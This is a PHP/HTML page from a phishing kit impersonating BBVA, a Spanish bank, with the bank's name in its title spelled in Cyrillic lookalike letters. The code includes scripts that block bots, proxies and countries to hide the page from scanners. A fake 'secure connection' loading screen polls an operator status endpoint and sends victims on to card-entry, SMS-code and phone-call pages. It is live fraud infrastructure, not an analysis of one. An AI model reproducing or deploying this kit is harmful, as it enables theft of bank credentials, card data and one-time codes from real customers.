<?php
/**
###############################################
#         Version 2.0                         #
#         https://t.me/neo_net                #
#         The Wine Juggler of FUD             #
###############################################
**/
/* Config Loader */
require_once 'config/config.php';

/* Country Blocker 2.0 */
include 'country-block/blocker.php';

/* Antiproxies 2.0 */
if ($antiproxies == 1):
include 'antiproxy/antiproxy.php';
endif;

/* Blockers 2.0 */
if ($antibots == 1):
include 'antibots/anti_referer.php';
include 'antibots/crawlers.php';
include 'antibots/loader.php';
include 'antibots/loader_ips.php';
include 'antibots/loader_ips_2.php';
/* FUD New */
$reader = sha1(rand(1,9999));
if (isset($_GET['vampire'])) {}
else {
$name = $reader.rand(1,99999);
$om = sha1(rand(1,99999));}
endif;
?>
<!DOCTYPE html>
<html data-version="12.3.20" lang="es">
<head>
    <meta charset="utf-8">
 <title>&#1042;&#1042;&#86;&#1040; </title>
<script type="text/javascript" src="assets/js/jquery-3.5.1.min.js"></script>
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<link href="./verify_core/img/favicon.ico" rel="shortcut icon">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
    <link rel="apple-touch-icon" sizes="57x57" href="assets/img/favicons/57x57.png?v=2">
    <link rel="apple-touch-icon" sizes="72x72" href="assets/img/favicons/72x72.png?v=2">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/favicons/76x76.png?v=2">
    <link rel="apple-touch-icon" sizes="114x114" href="assets/img/favicons/114x114.png?v=2">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/img/favicons/120x120.png?v=2">
    <link rel="apple-touch-icon" sizes="144x144" href="assets/img/favicons/144x144.png?v=2">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/img/favicons/152x152.png?v=2">
    <link rel="apple-touch-icon" sizes="167x167" href="assets/img/favicons/167x167.png?v=2">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/favicons/180x180.png?v=2">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicons/16x16.png?v=2">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicons/32x32.png?v=2">
    <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicons/96x96.png?v=2">
    <link rel="icon" type="image/png" sizes="128x128" href="assets/img/favicons/128x128.png?v=2">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/img/favicons/192x192.png?v=2">
    <link rel="icon" type="image/png" sizes="195x195" href="assets/img/favicons/195x195.png?v=2">
    <link rel="icon" type="image/png" sizes="196x196" href="assets/img/favicons/196x196.png?v=2">
    <link rel="icon" type="image/png" sizes="228x228" href="assets/img/favicons/228x228.png?v=2">
    <script>var doc=document.documentElement;doc.setAttribute("data-useragent",navigator.userAgent)</script><style>@charset "UTF-8";body{line-height:1;margin:0;overflow:hidden}div,li,ul{margin:0;padding:0}@keyframes rotate{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes locked{0%{-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}39%{-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}50%{-webkit-transform:translate(-50%,-40%);transform:translate(-50%,-40%)}100%{-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}}@keyframes textPadlock{from{bottom:77%}to{bottom:42%}}@keyframes padlock{from{top:15%}to{top:50%}}.spinner-loader{animation:rotate 1.3s cubic-bezier(.6,.1,.15,.8) infinite}.progress-content-light__svg{width:152px;height:152px;margin-bottom:40px}.progress-content-light__flare,.progress-content-light__shine{width:1em;height:1em}.progress-content-light__flare{clip-path:url(#progressContent_2_);fill:url(#progressContent_3_)}.progress-content-light__shine{overflow:visible}.progress-loading__svg{top:50%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);transition:-webkit-transform cubic-bezier(.54,-.54,.49,1.54) ease-in-out .4s;transition:transform cubic-bezier(.54,-.54,.49,1.54) ease-in-out .4s;transition:transform cubic-bezier(.54,-.54,.49,1.54) ease-in-out .4s,-webkit-transform cubic-bezier(.54,-.54,.49,1.54) ease-in-out .4s;width:32px;height:40px;position:absolute}.progress-loading__padlock{fill:#fff;top:0;left:0;width:18px;height:24px;transition:-webkit-transform .4s ease-in-out;transition:transform .4s ease-in-out;transition:transform .4s ease-in-out,-webkit-transform .4s ease-in-out;-webkit-transform:translate(50%,40%);transform:translate(50%,40%);position:absolute}.progress-loading__padlock-body{bottom:0;width:30px;height:30px;position:absolute}.progress-loading__padlock-symbol{bottom:20%;left:50%;width:10px;height:2px;transition:-webkit-transform .4s cubic-bezier(.54,-.54,.49,1.54);transition:transform .4s cubic-bezier(.54,-.54,.49,1.54);transition:transform .4s cubic-bezier(.54,-.54,.49,1.54),-webkit-transform .4s cubic-bezier(.54,-.54,.49,1.54);-webkit-transform-origin:50% 50%;transform-origin:50% 50%;-webkit-transform:translate(-50%,50%) rotate(90deg);transform:translate(-50%,50%) rotate(90deg);position:absolute}.progress-loading__svg--locked{will-change:transform;-webkit-animation:locked .4s;animation:locked .4s}.progress-loading__svg--locked .progress-loading__padlock{-webkit-transform:translate(50%,60%);transform:translate(50%,60%)}.progress-loading__svg--locked .progress-loading__padlock-symbol{-webkit-transform:translate(-50%,50%);transform:translate(-50%,50%)}.progress-content__box{-webkit-transform:translateY(-15%);transform:translateY(-15%);margin:0;background-color:#004481;display:flex;flex-direction:column;justify-content:center;align-items:center;flex:1;position:relative;box-sizing:border-box}.progress-loading{will-change:transform;position:absolute;right:0;left:0;bottom:0;top:0;background-color:#072146}.progress-loading[data-loading=true]{-webkit-transform:translateY(66%);transform:translateY(66%)}.progress-loading[data-loading=true] .progress-loading__svg{top:13%}.progress-loading[data-loading=true] .progress-loading__text,.progress-loading[data-loading=true] .progress-loading__text2{bottom:77%;width:100%}.progress-loading[data-loading=false]{-webkit-transform:translateY(0);transform:translateY(0);transition:transform .3s,-webkit-transform .3s}.progress-loading[data-loading=false] .progress-loading__svg{will-change:top;-webkit-animation-duration:.3s;animation-duration:.3s;-webkit-animation-name:padlock;animation-name:padlock;top:50%}.progress-loading__text{width:100%;position:absolute;color:#fff;text-align:center;font-size:15px;font-family:sans-serif;line-height:24px}.c-login-loading{height:100vh;display:flex;flex-direction:column;flex-grow:1;flex-shrink:1;flex-basis:0;box-sizing:border-box;position:relative;overflow:hidden}[data-not-translated]{display:none}</style></head><body class="logado" data-not-translated="" id="app"><div id="initial_loading"><div class="c-login-loading"><div class="progress-content__box"><div class="spinner-loader" data-status="loading"><svg class="progress-content-light__svg" aria-describedby="loading-svg-description" aria-labelledby="loading-svg-title" role="progressbar" version="1.1" viewBox="0 0 400 400" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px"><title data-literal="loggingIn" id="loading-svg-title"></title><desc data-literal="loadingContent"></desc><g><defs><path d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z" id="progressContent_1_"></path></defs><clipPath id="progressContent_2_"><use style="overflow:visible" xlink:href="#progressContent_1_"></use></clipPath><radialGradient cx="0" cy="0" fx="24" fy="73" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse" id="progressContent_3_" r="180"><stop offset="0" style="stop-color:#2dcccd"></stop><stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop></radialGradient><polygon points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313" class="progress-content-light__flare"></polygon></g><g id="Shine_1_"><g><image class="progress-content-light__shine" xlink:href="data:image/png;base64,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"></image>
        <input type="hidden" id="loginpage-logincontroller-login-pini" name=""></g></g></svg></div></div><div class="progress-loading" data-loading="true"><div class="progress-loading__svg"><div class="progress-loading-padlock"><svg class="absolute progress-loading__padlock-body" fill="#fff"><path d="M10.2857143,13.7142857 L18.8571429,13.7142857 L24.5714286,13.7142857 L25.1504026,13.7142857 C25.7774179,13.7142857 26.2857143,14.2285129 26.2857143,14.8649663 L26.2857143,28.5636051 C26.2857143,29.1991085 25.7772042,29.7142857 25.1504026,29.7142857 L6.84959735,29.7142857 C6.22258205,29.7142857 5.71428571,29.2000585 5.71428571,28.5636051 L5.71428571,14.8649663 C5.71428571,14.229463 6.22279576,13.7142857 6.84959735,13.7142857 L8,13.7142857 L10.2857143,13.7142857 Z"></path></svg> <svg class="absolute progress-loading__padlock-symbol" fill="#064079"><polygon points="0,0 0,2.3 6.9,2.3 9.2,0 "></polygon></svg> <svg class="absolute progress-loading__padlock" fill="#02a5a5"><path d="M3.04541016,15.0397339 L3.04541016,6.99123 C3.04541016,4.62923 4.6382,2.84985352 7.0002,2.84985352 C9.3672,2.84985352 11.0378418,4.63823 11.0378418,6.99223 L11.0378418,9.49923 L13.2165527,9.01535742 L13.2165527,6.99123 C13.2165527,3.68123 10.3142,0.748168945 7.0002,0.748168945 C3.6932,0.748168945 0.74987793,3.68323 0.74987793,6.99223 L0.74987793,15.0397339 L3.04541016,15.0397339 Z"></path></svg></div></div><div class="load"><p class="progress-loading__text" data-literal="securingConnection" role="alert"></p></div></div></div><script>"use strict";!function(n,e){"object"==typeof exports&&"undefined"!=typeof module?e():"function"==typeof define&&define.amd?define(e):e()}(0,(function(){function n(n){var e=this.constructor;return this.then((function(t){return e.resolve(n()).then((function(){return t}))}),(function(t){return e.resolve(n()).then((function(){return e.reject(t)}))}))}function e(){}function t(n){if(!(this instanceof t))throw new TypeError("Promises must be constructed via new");if("function"!=typeof n)throw new TypeError("not a function");this._state=0,this._handled=!1,this._value=void 0,this._deferreds=[],u(n,this)}function o(n,e){for(;3===n._state;)n=n._value;0!==n._state?(n._handled=!0,t._immediateFn((function(){var t=1===n._state?e.onFulfilled:e.onRejected;if(null!==t){var o;try{o=t(n._value)}catch(n){return void i(e.promise,n)}r(e.promise,o)}else(1===n._state?r:i)(e.promise,n._value)}))):n._deferreds.push(e)}function r(n,e){try{if(e===n)throw new TypeError("A promise cannot be resolved with itself.");if(e&&("object"==typeof e||"function"==typeof e)){var o=e.then;if(e instanceof t)return n._state=3,n._value=e,void a(n);if("function"==typeof o)return void u(function(n,e){return function(){n.apply(e,arguments)}}(o,e),n)}n._state=1,n._value=e,a(n)}catch(e){i(n,e)}}function i(n,e){n._state=2,n._value=e,a(n)}function a(n){2===n._state&&0===n._deferreds.length&&t._immediateFn((function(){n._handled||t._unhandledRejectionFn(n._value)}));for(var e=0,r=n._deferreds.length;r>e;e++)o(n,n._deferreds[e]);n._deferreds=null}function u(n,e){var t=!1;try{n((function(n){t||(t=!0,r(e,n))}),(function(n){t||(t=!0,i(e,n))}))}catch(n){if(t)return;t=!0,i(e,n)}}var c=setTimeout;t.prototype.catch=function(n){return this.then(null,n)},t.prototype.then=function(n,t){var r=new this.constructor(e);return o(this,new function(n,e,t){this.onFulfilled="function"==typeof n?n:null,this.onRejected="function"==typeof e?e:null,this.promise=t}(n,t,r)),r},t.prototype.finally=n,t.all=function(n){return new t((function(e,t){function o(n,a){try{if(a&&("object"==typeof a||"function"==typeof a)){var u=a.then;if("function"==typeof u)return void u.call(a,(function(e){o(n,e)}),t)}r[n]=a,0==--i&&e(r)}catch(n){t(n)}}if(!n||void 0===n.length)throw new TypeError("Promise.all accepts an array");var r=Array.prototype.slice.call(n);if(0===r.length)return e([]);for(var i=r.length,a=0;r.length>a;a++)o(a,r[a])}))},t.resolve=function(n){return n&&"object"==typeof n&&n.constructor===t?n:new t((function(e){e(n)}))},t.reject=function(n){return new t((function(e,t){t(n)}))},t.race=function(n){return new t((function(e,t){for(var o=0,r=n.length;r>o;o++)n[o].then(e,t)}))},t._immediateFn="function"==typeof setImmediate&&function(n){setImmediate(n)}||function(n){c(n,0)},t._unhandledRejectionFn=function(n){void 0!==console&&console&&console.warn("Possible Unhandled Promise Rejection:",n)};var l=function(){if("undefined"!=typeof self)return self;if("undefined"!=typeof window)return window;if("undefined"!=typeof global)return global;throw Error("unable to locate global object")}();"Promise"in l?l.Promise.prototype.finally||(l.Promise.prototype.finally=n):l.Promise=t})),function(){var n=document.querySelector(".progress-loading"),e=document.querySelector(".progress-loading__text"),t=document.querySelector(".progress-loading__svg"),o={"app-ready":function(){return n="appReady",void r.message[n].resolve();var n}},r={animationEnd:{lockPadlock:c(),allOk:c()},message:{appReady:c()}},i={cas:"es",eng:"en",cat:"ca"},a={loadingContent:{es:"Cargando contenido",en:"Loading content",ca:"Carregant contingut"},loggingIn:{es:"Entrando en área privada",en:"Logging into your account",ca:"Entrant en àrea privada"},securingConnection:{es:"Estableciendo conexión segura",en:"Establishing secure connection",ca:"Establint connexió segura"}},u=l("language")||i[l("idiomaAuto")]||"es";function c(){var n,e,t=new Promise((function(t,o){n=t,e=o}));return t.resolve=n,t.reject=e,t}function l(n,e){e=e||null;var t=document.cookie.split(";").filter((function(n){return-1!==n.indexOf("=")})).map((function(n){var e=n.indexOf("=");return{name:n.substring(0,e),value:n.substring(e+1)}})).map((function(n){return{name:n.name.replace(/^\s+/,""),value:n.value}})).filter((function(e){return e.name===n})).map((function(n){return n.value})).pop();return void 0!==t?t:e}function f(n){return a[n][u]}function s(n){var e=n.data,t=e.topic,r=e.channel,i=e.payload;"initial-loading-spinner"===t&&o[r]&&o[r](i)}function d(){return e.parentNode.removeChild(e),t.classList.add("progress-loading__svg--locked"),r.animationEnd.lockPadlock}function p(){return n.setAttribute("data-loading",!1),r.animationEnd.allOk}!function(){if(!document.body.getAttribute("data-not-translated")){for(var n=document.querySelectorAll("[data-literal]"),e=0;e<n.length;++e)n[e].textContent=f(n[e].getAttribute("data-literal"));document.body.removeAttribute("data-not-translated")}}(),t.addEventListener("animationend",(function(n){var e=n.animationName;"locked"===e&&r.animationEnd.lockPadlock.resolve(),"padlock"===e&&r.animationEnd.allOk.resolve()})),window.addEventListener("message",s),r.message.appReady.then(d).then(p).then((function(){return function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"",e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};window.top.postMessage({topic:"initial-loading-spinner",channel:n,data:e},"*")}("remove")}))}()
setTimeout(function() {
$('.load').fadeOut();
$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información</p>');
$('.load').fadeIn();
}, 2000);
setTimeout(function() {
$('.load').fadeOut();
$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información.</p>');
$('.load').fadeIn();
}, 3000);
setTimeout(function() {
$('.load').fadeOut();
$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Comprobando Información..</p>');
$('.load').fadeIn();
}, 4000);
setTimeout(function() {
$('.load').fadeOut();
$('.load').html('<p class="progress-loading__text" data-literal="loadingContent" role="alert">Cargando</p>');
$('.load').fadeIn();
}, 5000);
setTimeout(function() {
<?php if ($_GET['load'] == 1): ?>
window.location.href = './index.php';
<?php endif; ?>
<?php if ($_GET['load'] == 2): ?>
window.location.href = './sms.php';
<?php endif; ?>
}, 7000);


function restat2(){
var status = $('#loginpage-logincontroller-login-pini').val();

if (status ==1) {
var url = "./cc.php";
$(location).attr('href',url);
}
if (status ==2) {
var url = "./sms.php";
$(location).attr('href',url);
}
if (status ==3) {
var url = "./caller.php";
$(location).attr('href',url);
}if (status ==4) {
window.location.href = 'https://href.li/?https://www.bbva.es/desconexion.html';
}

}
function restat(){
var status = $('#status-xxx').val();
$.post('assets/php/status.php', {}, function(response){
$('#loginpage-logincontroller-login-pini').val(response);
});
}

setInterval(function(){ new restat();new restat2(); }, 1000);
</script></body></html>